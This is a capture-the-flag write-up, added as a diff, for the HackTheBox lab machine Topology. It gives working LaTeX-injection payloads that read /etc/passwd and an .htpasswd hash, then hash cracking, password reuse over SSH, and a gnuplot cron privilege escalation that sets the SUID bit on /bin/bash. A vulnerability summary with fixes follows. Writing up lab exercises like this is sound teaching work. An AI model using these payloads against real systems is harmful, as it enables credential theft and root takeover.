@@ -1,0 +1,519 @@
+<title>HackTheBox - Topology (Easy)</title>
+<header>
+	<div class="header">
+    <div class="titleContainer">
+    <img class="headerIcon" src="/write-ups/HackTheBox/Easy/Topology/icon.png"/>
+      <p class="mainTitle">HackTheBox - Topology (Easy)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+	<h1 id="table-of-contents">Table of contents</h1>
+	<nav id="tableOfContents" class="tableOfContents">
+	</nav>
+  <h1 id="reconnaissance">Reconnaissance</h1>
+	<h2 id="nmap-scan">Nmap scan</h2>
+	<div class="codeBlock"># Nmap 7.93 scan initiated Fri Jun 16 11:22:25 2023 as: nmap -A -p- -oN nmapResults.txt -T5 -v 10.10.11.217
+Nmap scan report for 10.10.11.217
+Host is up (0.026s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
+|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
+|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jun 16 11:22:42 2023 -- 1 IP address (1 host up) scanned in 16.57 seconds</div>
+	<h2 id="web-reconnaissance">Web reconnaissance</h2>
+	<p>Let’s take a look at the website :</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure1.png"/>
+	<p>
+		We have an email address which gives us a potential username(<code>lklein</code>) and a domain name 
+    (<code>topology.htb</code>). Also, there is a hyperlink (<code>LaTeX Equation Generator</code>) that redirects us 
+		to <code>http://latex.topology.htb/equation.php</code>. 
+	</p>
+	<p>
+		Let’s add the domain and the virtual host we just found to our <strong class="highlight-red">/etc/hosts</strong> file : 
+	</p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat /etc/hosts
+127.0.0.1       localhost       gitea.searcher.htb
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.217    topology.htb    latex.topology.htb</div>
+	<p>
+		Let’s enumerate other virtual hosts using <a href="https://github.com/OJ/gobuster">Gobuster</a> : 
+	</p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ gobuster vhost -u http://topology.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://topology.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.5
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/06/17 08:17:03 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: dev.topology.htb Status: 401 [Size: 463]
+Found: stats.topology.htb Status: 200 [Size: 108]</div>
+	<p>We found two other virtual hosts. Let’s add them to our <code>/etc/hosts</code> file : </p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat /etc/hosts
+127.0.0.1       localhost       gitea.searcher.htb
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.10.11.217    topology.htb    latex.topology.htb      dev.topology.htb        stats.topology.htb</div>
+	<p>
+		The second one does not seems to be useful for an attacker. But the first one (<code>dev.topology.htb</code>) 
+    requires us to authenticate using a <b>Basic Authentication</b> : 
+	</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure2.png"/>
+	<p>
+		The credentials for basic authentication on an Apache webserver are commonly found in the <code>.htpasswd</code> file at the root of the virtual host. If we want to find credentials for this virtual host, 
+		we will need to find a way to read arbitrary files on the web server.
+	</p>
+	<p>Let’s take a look at <code>http://latex.topology.htb/equation.htb</code> :</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure3.png"/>
+	<p>
+		We can enter <b>LaTeX equations</b> in a field and generate a PNG from it. Here is an example with <code>\frac{52}{142+y}</code> :
+	</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure4.png"/>
+	<h1>Initial access</h1>
+	<p>
+		Since we can enter LaTeX code in this field, we may be able to inject malicious LaTeX code to read arbitrary files. Let’s try to read <strong>/etc/passwd</strong> with the following payload : 
+	</p>
+	<pre class="code"><code>\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\text{\line}
+\closein\file</code></pre>
+	<p>
+		It gives us this PNG : 
+	</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure5.png"/>
+	<p>
+		So we are able to read arbitrary files. This payload can only read the first line of a file, but we don’t need to read more lines if we want to 
+    read the <code>.htpasswd</code> file in the <code>dev</code> virtual host. By default, the root of the <code>dev</code> virtual host 
+    should be located in <code>/var/www/dev/</code>. Let’s try to read this file with the following payload :
+	</p>
+	<div class="codeBlock">\newread\file
+\openin\file=/var/www/dev/.htpasswd
+\read\file to\line
+\text{\line}
+\closein\file</div>
+	<p>It gives us this response :</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure6.png"/>
+	<p>
+		We have an error. This could be due to the <code>$</code> signs in the hash in the <code>.htpasswd</code> file since those characters 
+    have a special meaning in LaTeX. They are used to start and finish math mode. If we take a look at the root of the <code>latex</code> 
+    virtual host, we can find something interesting : 
+	</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure7.png"/>
+	<p>We can see the <code>equationtest.tex</code> file. It contains a LaTeX script. Let’s take a look at it :</p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat ~/Downloads/equationtest.tex
+\documentclass{standalone}
+\input{header}
+\begin{document}
+
+$ \int_{a}^b\int_{c}^d f(x,y)dxdy $
+
+\end{document}</div>
+	<p>
+		From this file, we can deduce that our input on the <code>equation.php</code> page will be inserted between 
+    two <code>$</code> signs. Let’s take for example this hash : 
+	</p>
+	<div class="codeBlock">$apr1$rvk6cUzh$iYXx6JO0dG3.gOtFm1cRX0</div>
+	<p>If this type of hash is contained in the file we are trying to read, it will be interpreted like so :</p>
+	<div class="codeBlock">\documentclass{standalone}
+\input{header}
+\begin{document}
+
+$ $apr1$rvk6cUzh$iYXx6JO0dG3.gOtFm1cRX0 $
+
+\end{document}</div>
+	<p>
+		In LaTeX, if we open math mode with a dollar sign, we need to close it or it will cause an error. Here, we can see that there is an odd number 
+    of dollar signs. This may be the cause of the error when we try to read <code>/var/www/dev/.htpasswd</code>. To avoid this error, we need 
+    to add an extra dollar sign after we append the content of <code>.htpasswd</code> in our payload :
+	</p>
+	<div class="codeBlock">\newread\file
+\openin\file=/var/www/dev/.htpasswd
+\read\file to\line
+\line$
+\closein\file</div>
+	<p>It gives us this PNG :</p>
+	<img src="/write-ups/HackTheBox/Easy/Topology/figure8.png"/>
+	<p>
+		We successfully read the content of <code>/var/www/dev/.htpasswd</code>. Since the dollar signs are interpreted as math mode start 
+    and stop, they are missing from the output. Since the dollar signs are always at the same place in this type of hash, we can take example 
+    on another hash of the same type (apr1) to place the missing dollar signs. It gives us the following hash : 
+	</p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat hash.txt                    
+$apr1$1ONUB/S2$58eeNV[HIDDEN]</div>
+	<p>Let’s try to crack this hash :</p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+[HIDDEN]       (?)     
+1g 0:00:00:06 DONE (2023-06-17 08:57) 0.1506g/s 149956p/s 149956c/s 149956C/s calebd1..caitlyn09
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</div>
+	<p>
+		Now we have the credentials for the Basic Authentication on the <code>dev</code> virtual host. But we can try to use 
+    those credentials to login via <b>SSH</b> : 
+	</p>
+	<div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ ssh vdaisley@10.10.11.217
+vdaisley@10.10.11.217&#x27;s password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+vdaisley@topology:~$</div>
+	<p>Now we have a foothold on the system as <code>vdaisley</code>.</p>
+	<h1 id="post-exploitation">Post-exploitation</h1>
+	<h2 id="local-reconnaissance">Local reconnaissance</h2>
+	<p>Let’s take a look at the running processes using <a href="https://github.com/DominicBreuker/pspy">pspy</a> :</p>
+	<div class="codeBlock">vdaisley@topology:~$ wget http://10.10.14.3/pspy64
+--2023-06-17 09:01:18--  http://10.10.14.3/pspy64
+Connecting to 10.10.14.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64          100%[=====&gt;]   2.96M  7.88MB/s    in 0.4s    
+
+2023-06-17 09:01:18 (7.88 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+vdaisley@topology:~$ chmod +x pspy64
+vdaisley@topology:~$ ./pspy64 
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/06/17 09:01:36 CMD: UID=1007  PID=5955   | ./pspy64 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5893   | -bash 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5892   | sshd: vdaisley@pts/0 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5847   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                   
+2023/06/17 09:01:36 CMD: UID=113   PID=5828   | /usr/libexec/rtkit-daemon 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5807   | /usr/bin/pulseaudio --daemonize=no --log-target=journal 
+[CROPPED]
+2023/06/17 09:02:01 CMD: UID=0     PID=5972   | gnuplot /opt/gnuplot/loadplot.plt 
+2023/06/17 09:02:01 CMD: UID=0     PID=5971   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
+2023/06/17 09:02:01 CMD: UID=0     PID=5970   | /bin/sh -c find &quot;/opt/gnuplot&quot; -name &quot;*.plt&quot; -exec gnuplot {} \; 
+2023/06/17 09:02:01 CMD: UID=0     PID=5969   | /usr/sbin/CRON -f 
+2023/06/17 09:02:01 CMD: UID=0     PID=5968   | /usr/sbin/CRON -f 
+2023/06/17 09:02:01 CMD: UID=0     PID=5978   | cut -d   -f3,7 
+2023/06/17 09:02:01 CMD: UID=0     PID=5977   | tr -s   
+2023/06/17 09:02:01 CMD: UID=0     PID=5976   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5974   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5982   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5981   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5980   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5979   | uptime 
+2023/06/17 09:02:01 CMD: UID=0     PID=5985   | gnuplot /opt/gnuplot/networkplot.plt</div>
+	<p>
+		It looks like the <code>root</code> user is repeatedly running the command <code>find /opt/gnuplot -name *.plt -exec gnuplot {} ;</code>. 
+    It finds every <code>.plt</code> files in <code>/opt/gnuplot</code> and runs them with <code>gnuplot</code>. Let’s see what 
+    permissions we have on <code>/opt/gnuplot</code> :
+	</p>
+	<div class="codeBlock">vdaisley@topology:~$ ls -la /opt/
+total 12
+drwxr-xr-x  3 root root 4096 May 19 13:04 .
+drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..
+drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot</div>
+	<p>We have <b>write permissions</b> in <code>/opt/gnuplot</code>.</p>
+	<h2 id="privilege-escalation">Privilege escalation</h2>
+	<p>
+		We can write a malicious <code>.plt</code> file that will execute a system command to set the <b>SUID bit</b> on 
+    <code>/bin/bash</code> to gain a shell as <code>root</code> since we can execute system commands with <code>gnuplot</code> : 
+	</p>
+	<div class="codeBlock">vdaisley@topology:~$ echo &#x27;system(&quot;chmod +s /bin/bash&quot;)&#x27; &gt; /opt/gnuplot/exploit.plt
+vdaisley@topology:~$ chmod +x /opt/gnuplot/exploit.plt</div>
+		<p>
+			Now, we need to wait till the <code>root</code> user runs the command again. After waiting some times, let’s take a look at the permissions on <strong>/bin/bash</strong> : 
+		</p>
+	<div class="codeBlock">vdaisley@topology:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash</div>
+	<p>
+		The <b>SUID bit</b> was successfully activated on <b>/bin/bash</b>. Now we can spawn a shell as <code>root</code> : 
+	</p>
+	<div class="codeBlock">vdaisley@topology:~$ bash -p
+bash-5.0# whoami
+root</div>
+	<h1 id="clearing-tracks">Clearing tracks</h1>
+	<table>
+		<thead>
+			<tr>
+				<th>Step</th>
+				<th>Tracks to remove</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td>Post-exploitation - Privilege escalation</td>
+				<td>- Remove SUID from /bin/bash<br/>- Remove exploit.plt in /opt/gnuplot/</td>
+			</tr>
+			<tr>
+				<td>Post-exploitation - Local enumeration</td>
+				<td>- Remove pspy64 from /home/vdaisley</td>
+			</tr>
+		</tbody>
+	</table>
+	<h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+	<h2 id="arbitrary-file-read">Arbitrary File Read</h2>
+	<table>
+		<thead>
+			<tr>
+				<th>Field</th>
+				<th>Value</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td>Affected component</td>
+				<td>Web server</td>
+			</tr>
+			<tr>
+				<td>CVSS 3.0 score</td>
+				<td><mark class="highlight_red">7.5</mark></td>
+			</tr>
+			<tr>
+				<td>Severity</td>
+				<td><mark class="highlight_red">HIGH</mark></td>
+			</tr>
+			<tr>
+				<td>Attack vector</td>
+				<td>Network</td>
+			</tr>
+			<tr>
+				<td>Impact</td>
+				<td>
+					Allows an attacker to partially read arbitrary files. This can lead to sensitive informations disclosure. During the assessment, 
+          we found the password hash of a local user.<br>
+          <br>
+					This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
+				</td>
+			</tr>
+			<tr>
+				<td>Remediation proposition</td>
+				<td>
+					Add filters to user input in the request made to <code>equation.php</code>. For example, create a whitelist of all authorized commands.<br>
+          <br>
+          You could also set up a blacklist containing the malicious commands used during the assessment (<code>\newread</code>, <code>\openin</code>, <code>\read</code>).
+				</td>
+			</tr>
+		</tbody>
+	</table>
+	<h2 id="weak-password">Weak password</h2>
+	<table>
+		<thead>
+			<tr>
+				<th>Field</th>
+				<th>Value</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td>Affected component</td>
+				<td>Local system</td>
+			</tr>
+			<tr>
+				<td>CVSS 3.0 score</td>
+				<td><mark class="highlight_orange">6.2</mark></td>
+			</tr>
+			<tr>
+				<td>Severity</td>
+				<td><mark class="highlight_orange">MEDIUM</mark></td>
+			</tr>
+			<tr>
+				<td>Attack vector</td>
+				<td>N/A</td>
+			</tr>
+			<tr>
+				<td>Impact</td>
+				<td>
+					Allows an attacker to crack the password hash found with the previous vulnerability.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the 
+          affected component.
+				</td>
+			</tr>
+			<tr>
+				<td>Remediation proposition</td>
+				<td>Set up a strong password policy</td>
+			</tr>
+		</tbody>
+	</table>
+	<h2 id="password-reuse">Password reuse</h2>
+	<table>
+		<thead>
+			<tr>
+				<th>Field</th>
+				<th>Value</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td>Affected component</td>
+				<td>Local system</td>
+			</tr>
+			<tr>
+				<td>CVSS 3.0 score</td>
+				<td><mark class="highlight_orange">6.2</mark></td>
+			</tr>
+			<tr>
+				<td>Severity</td>
+				<td><mark class="highlight_orange">MEDIUM</mark></td>
+			</tr>
+			<tr>
+				<td>Attack vector</td>
+				<td>Network</td>
+			</tr>
+			<tr>
+				<td>Impact</td>
+				<td>
+					Allows an attacker to log in via SSH since the HTTP password is the same as the vdaisley local user password.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
+				</td>
+			</tr>
+			<tr>
+				<td>Remediation proposition</td>
+				<td>Set up a strong password policy</td>
+			</tr>
+		</tbody>
+	</table>
+	<h2 id="gnuplot-job-misconfiguration">Gnuplot job misconfiguration</h2>
+	<table>
+		<thead>
+			<tr>
+				<th>Field</th>
+				<th>Value</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td>Affected component</td>
+				<td>Local system</td>
+			</tr>
+			<tr>
+				<td>CVSS 3.0 score</td>
+				<td><mark class="highlight_red">7.8</mark></td>
+			</tr>
+			<tr>
+				<td>Severity</td>
+				<td><mark class="highlight_red">HIGH</mark></td>
+			</tr>
+			<tr>
+				<td>Attack vector</td>
+				<td>Local</td>
+			</tr>
+			<tr>
+				<td>Impact</td>
+				<td>
+					Allows an attacker to execute a malicious .plt file leading to an arbitrary os command execution.<br>
+          <br>
+          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>integrity</b> 
+					and <b>availability</b> of the affected component.
+				</td>
+			</tr>
+			<tr>
+				<td>Remediation proposition</td>
+				<td>
+					If user <code>vdaisley</code> does not need write permissions in <code>/opt/gnuplot</code>, remove write permissions in this directory.<br>
+          <br>
+          Else, set up a blacklist to avoid executing <code>.plt</code> files if they contain the <code>system</code> command.
+				</td>
+			</tr>
+		</tbody>
+	</table>
+	<h1 id="tools-used">Tools used</h1>
+	<table>
+		<thead>
+			<tr>
+				<th>Tool</th>
+				<th>Purpose</th>
+			</tr>
+		</thead>
+		<tbody>
+			<tr>
+				<td><a href="https://nmap.org/book/man.html">Nmap</a></td>
+				<td>- Scan for open ports<br/>- Scan services versions<br/></td>
+			</tr>
+			<tr>
+				<td><a href="https://github.com/OJ/gobuster">Gobuster</a></td>
+				<td>- Fuzz virtual hosts</td>
+			</tr>
+			<tr>
+				<td><a href="https://www.openwall.com/john/doc/">John</a></td>
+				<td>- Crack password hashes</td>
+			</tr>
+			<tr>
+				<td><a href="https://github.com/DominicBreuker/pspy">Pspy</a></td>
+				<td>- List running processes</td>
+			</tr>
+		</tbody>
+	</table>
+	<h1 id="sources">Sources</h1>
+	<ul>
+		<li>LaTeX special characters : <a href="http://www.personal.ceu.hu/tex/specchar.htm">http://www.personal.ceu.hu/tex/specchar.htm</a></li>
+	</ul>
+	<ul>
+		<li>LaTeX injections : <a href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection</a></li>
+	</ul>
+	<ul>
+		<li>Gnuplot system command : <a href="https://gnuplot.sourceforge.net/docs_4.2/node336.html">https://gnuplot.sourceforge.net/docs_4.2/node336.html</a></li>
+	</ul>
+</div>
